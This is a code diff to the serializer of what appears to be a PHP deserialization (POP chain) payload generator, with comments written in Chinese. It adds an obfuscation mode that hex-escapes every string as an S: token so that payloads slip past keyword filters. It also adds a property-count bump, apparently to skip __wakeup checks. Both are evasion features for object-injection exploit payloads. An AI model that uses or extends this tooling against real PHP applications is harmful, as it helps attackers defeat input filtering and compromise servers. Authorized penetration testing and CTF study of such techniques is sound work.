@@ -13,6 +13,14 @@ namespace PopChain\Payload;
  */
 final class Serializer
 {
+    /**
+     * @param bool $obfuscate 用 S: 十六进制转义字符串（S:5:"f6..."）代替 s:，
+     *                        用于绕过关键字过滤（O:+N: 这种带符号长度 PHP 解析器不接受，不生成）
+     */
+    public function __construct(private bool $obfuscate = false)
+    {
+    }
+
     public function serializeNode(PayloadNode $node): string
     {
         $body = '';
@@ -25,7 +33,7 @@ final class Serializer
             'O:%d:"%s":%d:{%s}',
             strlen($node->class),
             $node->class,
-            count($node->properties),
+            count($node->properties) + $node->declaredBump,
             $body,
         );
     }
@@ -36,7 +44,7 @@ final class Serializer
             return $this->serializeNode($value);
         }
         if (is_string($value)) {
-            return sprintf('s:%d:"%s";', strlen($value), $value);
+            return $this->stringToken($value);
         }
         if (is_int($value)) {
             return 'i:' . $value . ';';
@@ -69,6 +77,21 @@ final class Serializer
             default => $name,
         };
 
-        return sprintf('s:%d:"%s";', strlen($key), $key);
+        return $this->stringToken($key);
+    }
+
+    /** 普通模式 s:；混淆模式 S: + 全字节十六进制转义。 */
+    private function stringToken(string $value): string
+    {
+        if (!$this->obfuscate) {
+            return sprintf('s:%d:"%s";', strlen($value), $value);
+        }
+
+        $escaped = '';
+        for ($index = 0, $length = strlen($value); $index < $length; $index++) {
+            $escaped .= sprintf('\\%02x', ord($value[$index]));
+        }
+
+        return sprintf('S:%d:"%s";', strlen($value), $escaped);
     }
 }
